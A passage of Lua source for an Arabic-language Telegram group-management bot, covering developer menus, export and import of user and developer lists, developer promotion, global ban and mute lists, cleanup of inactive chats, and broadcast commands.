if k == 1 then 
t =  t..'"'..v..'"' 
else 
t =  t..',"'..v..'"' 
end 
end 
t = t..']}' 
local File = io.open('./users.json', "w") 
File:write(t) 
File:close() 
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './users.json', ' عدد المشتركين { '..#list..'}') 
end

if text == 'رفع المشتركين' and DevSoFi(msg) then 
function by_reply(extra, result, success)    
if result.content_.document_ then  
local ID_FILE = result.content_.document_.document_.persistent_id_  
local File_Name = result.content_.document_.file_name_ 
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) )  
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name)  
local info_file = io.open('./users.json', "r"):read('*a') 
local users = JSON.decode(info_file) 
for k,v in pairs(users.users) do 
database:sadd(bot_id..'User_Bot',v)  
end 
send(msg.chat_id_,msg.id_,'تم رفع المشتركين ') 
end    
end 
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil) 
end
if text == '/start' and DevSoFi(msg) then 
local Text = '♤انت الان المطور الاساسي في البوت \n ♤سورس الملوك\n ♤يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/eLmLoK0)'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '♤ 𝒕𝒊𝒎𝒐  ',url="t.me/ttimo_8lby"},{text = '♤ 𝒂𝒃𝒐 𝒆𝒍𝒎𝒂𝒈𝒅',url="t.me/ABO_ELMAGD2"}},
{{text = '♤ 𝒐𝒎𝒂𝒓  ',url="t.me/teemElmelok"},{text = '♤ 𝒎𝒐𝒔𝒕𝒂𝒇𝒂 ',url="t.me/J_A_B_W_A"}},
{{text = 'أضفہ ألبہوتہ أليہ مہجہمہوعہتہكہ°' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/timo_019/40&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'قسم مطورين السورس والمبرمجين' and DevSoFi(msg) then 
local Text = 'قسم مطورين السورس لدخول الي حسابتهم'
local Key = {
{'♤مـطـوريـن الـسـورس♤'},
{'التواصل','عايز بوت','يا سورس'},
{'مبرمج تيمو','مبرمج ابو المجد'},
{'مالك عمر','مبرمج جابوا'},
{'العوده♤'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 
if text == 'قــسم مـسح♤اضـف' and DevSoFi(msg) then 
local Text = 'قسم مسح واضف مثلا اضف رد عام مسح رد عام'
local Key = {
{'اضف رد عام','مسح رد عام'},
{'مسح رد استارت','اضف رد استارت'},
{'اضف رد متعدد','مسح رد متعدد'},
{'ضع كليشه ستارت','مسح كليشه ستارت'},
{'ضع قناة الاشتراك','مسح رساله الاشتراك'},
{'العوده♤'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 
if text == 'قـسم تـفعيل♤تـعطيل' and DevSoFi(msg) then 
local Text = 'قسم التفعيل والتعطيل لتفعيل كل شئ في البوت'
local Key = {
{'تعطيل الاذاعه','تفعيل الاذاعه'},
{'تعطيل المغادره','تفعيل المغادره'},
{'تعطيل التواصل ','تفعيل التواصل '},
{'تفعيل الاشتراك الاجباري','تعطيل الاشتراك الاجباري'},
{'تفعيل البوت الخدمي ','تعطيل البوت الخدمي '},
{'العوده♤'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 
if text == 'قـسم الـحمايه' and DevSoFi(msg) then 
local Text = 'قسم الحمايه يوجد في المطورين والثانوين والخ...'
local Key = {
{'قائمه الكتم العام','المطورين','قائمه العام'},
{'المشتركين','الجروبات ','الردود العامه'},
{'الثانوين'},
{'تنظيف الجروبات ','تنظيف المشتركين'},
{'تغير رساله الاشتراك ','الاشتراك الاجباري','تغير الاشتراك'},
{'العوده♤'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 
if text == 'قـسم الاذاعـه' and DevSoFi(msg) then 
local Text = 'قسم الاذاعات لعمل اذاعه في البوت'
local Key = {
{'اذاعه ','اذاعه خاص '},
{'اذاعه بالتثبيت '},
{'اذاعه بالتوجيه ','اذاعه بالتوجيه خاص '},
{'العوده♤'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 

if text == "المطور" or text == "مطور" then
local TEXT_SUD = database:get(bot_id..'Tshake:TEXT_SUDO')
if TEXT_SUDO then 
send(msg.chat_id_, msg.id_,TEXT_SUDO)
else
tdcli_function ({ID = "GetUser",user_id_ = SUDO,},function(arg,result) 
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '♤ الـــــــمــــــطــــــور\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
},
{
{text = 'أضفہ ألبہوتہ أليہ مہجہمہوعہتہكہ°' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Name)..'&photo='..taha.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
sendText(msg.chat_id_,Name,msg.id_/2097152/0.5,'md')
 end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = SUDO, offset_ = 0, limit_ = 1 }, taha, nil)
end,nil)
end
end

if text == 'جلب المطورين' and DevSoFi(msg) then  
local list = database:smembers(bot_id..'Sudo:User') 
local t = '{"users":['   
for k,v in pairs(list) do 
if k == 1 then 
t =  t..'"'..v..'"' 
else 
t =  t..',"'..v..'"' 
end 
end 
t = t..']}' 
local File = io.open('./sudos3.json', "w") 
File:write(t) 
File:close() 
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './sudos3.json', ' عدد المطورين { '..#list..'}') 
end 
if text == 'رفع المطورين' and DevSoFi(msg) then 
function by_reply(extra, result, success)    
if result.content_.document_ then  
local ID_FILE = result.content_.document_.document_.persistent_id_  
local File_Name = result.content_.document_.file_name_ 
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) )  
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name)  
local info_file = io.open('./sudos3.json', "r"):read('*a') 
local users = JSON.decode(info_file) 
for k,v in pairs(users.users) do 
database:sadd(bot_id..'Sudo:User',v)  
end 
send(msg.chat_id_,msg.id_,'تم رفع المطورين ') 
end    
end 
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil) 
end
if text == 'جلب الثانوين' and DevSoFi(msg) then  
local list = database:smembers(bot_id..'Dev:SoFi:2') 
local t = '{"users":['   
for k,v in pairs(list) do 
if k == 1 then 
t =  t..'"'..v..'"' 
else 
t =  t..',"'..v..'"' 
end 
end 
t = t..']}' 
local File = io.open('./sanween.json', "w") 
File:write(t) 
File:close() 
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './sanween.json', ' عدد الثانوين { '..#list..'}') 
end
if text == 'رفع الثانوين' and DevSoFi(msg) then 
function by_reply(extra, result, success)    
if result.content_.document_ then  
local ID_FILE = result.content_.document_.document_.persistent_id_  
local File_Name = result.content_.document_.file_name_ 
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) )  
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name)  
local info_file = io.open('./sudos3.json', "r"):read('*a') 
local users = JSON.decode(info_file) 
for k,v in pairs(users.users) do 
database:sadd(bot_id..'Dev:SoFi:2',v)  
end 
send(msg.chat_id_,msg.id_,'تم رفع الثانوين ') 
end    
end 
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil) 
end
if text == 'الاصدار' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ♤ اصدار سورس الملوك{ 4x}')
end
if text == '♤مـطـوريـن الـسـورس♤' then
local Text = [[ 
قناه يوزرات مطورين ومبرمجين السورس 💕♤.
محتاج تنصب بوت ببلاش تواصل معانا 🥂▽.
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°', url="https://t.me/eLmLoK0"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/timo_019/40&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس الملوك ادخل وتابع الجديد](t.me/eLmLoK0)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°', url="t.me/eLmLoK0"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/timo_019/40&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '━┅┅┄⟞⟦°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°⟧⟝┄┉┉━' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس الملوك ادخل وتابع الجديد](t.me/eLmLoK0)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°', url="t.me/eLmLoK0"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/timo_019/40&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'معلومات الكيبورد' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/eLmLoK0)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
1• الاحصائيات { لعرض عدد المجموعات● والمشتركين في البوت
 2• تفعيل التواصل{ لتفعيل التواصل عبر البوت خاص بك} 
 3• تعطيل التواصل{ لتعطيل التواصل عبر البوت خاص بك } 
 4• قائمه العام { لعرض المحظورين عام في البوت }
 5• المطورين { لعرض المطورين في بوتك }
8• اذاعه { ارسال رساله لجميع الجروبات في بوتك }
9• اذاعه خاص { ارسال رساله لجميع مشتركين بوتك!} 
10• تعطيل الاشتراك الاجباري { لتعطيل الاشتراك جباري خاص بوتك}
11• تفعيل الاشتراك الاجباري { لتفعيل الاشتراك الاجباري بوتك }
12•اذاعه بالتوجيه { ارسال رساله بالتوجيه الي جميع المجموعات }
13• اذاعه بالتوجيه خاص { ارسال رساله بالتوجيه الي جميع المشتركين }
14• تفعيل البوت الخدمي { يمكن هاذا امر ان منشئ الكروب يفعل البوت م̷ـــِْن دون حتياجه لمطور البوت
15• تعطيل البوت الخدمي { يمك هل خاصيه ان تفعيل البوت اله مطورين البوت فقط }
16• تنظيف المشتركين { يمكنك ازاله المشتركين الوهمين عبر هل امر }
17• تنظيف الجروبات { يمكن ازاله المجموعات الوهميه عبر عل امر }
18• جلب نسخه احتياطيه { لعرض ملف المجموعات بوتك }
19• تحديث السورس { لتحديث السورس خاص بوتك 
20• الغاء { للغاء الامر الذي طلبته }
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°', url="t.me/eLmLoK0"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "بليز البوت" and SudoBot(msg) or text == 'ممكن التوكن' and SudoBot(msg) then 
if not DevSoFi(msg) then
send(msg.chat_id_, msg.id_,'هذا الامر خاص بمطور البوت')
return false
end
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.sender_user_id_ .. '&text=' ..token) 
send(msg.chat_id_, msg.id_,' ') 
end
if text == 'قناه السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 ♤ من أحسن السورسات على التليجرام سورس الملوك ♤
بجد سورس أمان جدا وفي مميزات جامده
تع نصب بوتك عندنا لو محظور
خش علي تواصل هيدخلك قناه اليوزرات 
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°', url="t.me/eLmLoK0"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/timo_019/40&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == "ضع اسم للبوت" and DevSoFi(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," ♤ ارسل اليه الاسم الان ")
return false
end
if text == ("الثانوين") and SudoBot(msg) then
local list = database:smembers(bot_id.."Dev:SoFi:2")
t = "\n ♤ قائمة مطورين الثانويين للبوت \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ♤ لا يوجد مطورين ثانويين"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("المطورين") and SudoBot(msg) then
local list = database:smembers(bot_id..'Sudo:User')
t = "\n ♤ قائمة المطورين \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ♤ '..v..' ♤\n"
end
end
if #list == 0 then
t = " ♤ لا يوجد مطورين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("قائمه العام") and SudoBot(msg) then
local list = database:smembers(bot_id..'GBan:User')
t = "\n ♤ قائمه المحظورين عام \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ♤ '..v..' ♤\n"
end
end
if #list == 0 then
t = " ♤ لا يوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("قائمه الكتم العام") and SudoBot(msg) then
local list = database:smembers(bot_id..'Gmute:User')
t = "\n ♤ قائمة المكتومين عام \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ♤ '..v..' ♤\n"
end
end
if #list == 0 then
t = " ♤ لا يوجد مكتومين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text=="اذاعه خاص " and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ♤ ارسل الان اذاعتك● \n ♤ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه " and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ♤ ارسل الان اذاعتك● \n ♤ للخروج ارسل الغاء ")
return false
end  
if text=="اذاعه بالتوجيه " and msg.reply_to_message_id_ == 0  and SudoBot(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ♤ ارسل لي التوجيه الان")
return false
end 
if text=="اذاعه بالتوجيه خاص " and msg.reply_to_message_id_ == 0  and SudoBot(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ♤ ارسل لي التوجيه الان")
return false
end 
if text == 'جلب النسخه' and DevSoFi(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين " and SudoBot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي ♤ •\n• لايمكنك استخدام البوت ♤ •\n• عليك الاشتراك في القناة ♤ •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local pv = database:smembers(bot_id.."User_Bot")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
database:srem(bot_id.."User_Bot",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,' ♤ لا يوجد مشتركين وهميين في البوت \n')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,' ♤ عدد المشتركين الان  ⇦♤( '..#pv..' )\n ♤ تم ازالة  ⇦♤( '..sendok..' ) من المشتركين\n ♤  الان عدد المشتركين الحقيقي  ⇦♤( '..ok..' ) مشترك \n')   
end
end
end,nil)
end,nil)
end
return false
end
if text == "تنظيف الجروبات " and SudoBot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي ♤ •\n• لايمكنك استخدام البوت ♤ •\n• عليك الاشتراك في القناة ♤ •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local group = database:smembers(bot_id..'Chek:Groups') 
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem(bot_id..'Chek:Groups',group[i])  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=group[i],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,' ♤ لا يوجد جروبات وهميه في البوت\n')   
else
local DRAGON = (w + q)
local sendok = #group - DRAGON
if q == 0 then
DRAGON = ''
else
DRAGON = '\n ♤ تم ازالة  ⇦♤ '..q..' ♤ جروبات من البوت'
end
if w == 0 then
DRAGONk = ''
else
DRAGONk = '\n ♤ تم ازالة  ⇦♤ '..w..' ♤ كروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,' ♤  عدد الجروبات الان  ⇦♤ '..#group..' ♤'..DRAGONk..''..DRAGON..'\n ♤  الان عدد الجروبات الحقيقي  ⇦♤ '..sendok..' ♤ جروبات\n')   
end
end
end,nil)
end
return false
end


if text and text:match("^رفع مطور @(.*)$") and DevSoFi(msg) then
local username = text:match("^رفع مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ♤ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")
return false 
end      
database:sadd(bot_id..'Sudo:User', result.id_)
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ♤ تم ترقيته مطور'
texts = usertext..status
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور (%d+)$") and DevSoFi(msg) then
local userid = text:match("^رفع مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text and text:match("^تنزيل مطور @(.*)$") and DevSoFi(msg) then
local username = text:match("^تنزيل مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Sudo:User', result.id_)
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من المطورين'
texts = usertext..status
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مطور (%d+)$") and DevSoFi(msg) then
local userid = text:match("^تنزيل مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end

end
--------------------------------------------------------------------------------------------------------------
if text and not Special(msg) then  
local DRAGON1_Msg = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..text..msg.chat_id_)   
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤ الـعـضو   ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
end
if database:get(bot_id..'Set:Name:Bot'..msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ' then   
send(msg.chat_id_, msg.id_," ♤ تم الغاء حفظ اسم البوت")
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
return false  
end 
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
database:set(bot_id..'Name:Bot',text) 
send(msg.chat_id_, msg.id_, " ♤ تم حفظ الاسم")
return false
end 
if database:get(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ♤' then   
send(msg.chat_id_, msg.id_," ♤ تم الغاء الاذاعه للخاص")
database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id..'User_Bot') 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,'['..msg.content_.text_..']')  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_," ♤ تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end

if database:get(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ♤' then   
send(msg.chat_id_, msg.id_," ♤ تم الغاء الاذاعه")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id..'Chek:Groups') 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,'['..msg.content_.text_..']')  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_," ♤ تمت الاذاعه الى >>{"..#list.."} كروب في البوت ")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end

